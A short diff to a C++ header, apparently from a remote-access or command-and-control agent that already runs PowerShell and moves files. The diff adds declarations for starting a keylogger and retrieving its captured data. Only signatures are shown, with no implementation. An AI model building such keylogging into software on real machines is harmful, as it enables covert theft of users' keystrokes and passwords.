@@ -31,6 +31,8 @@ public:
 	Response ExecutePowerShell(const int &taskID, const CommandPowershell &psRequest);
 	Response UploadFile(const int &taskID, const CommandUploadFile &uploadRequest);
 	Response DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest);
+	Response keylog_start(const int &taskID, const keyloggerStartRequest &keyloggerStartRequest);
+	Response get_keylog_data(const int &taskID, const keyloggerStopRequest &keyloggerStopRequest);
 
 private:
 	CommManager commManager;
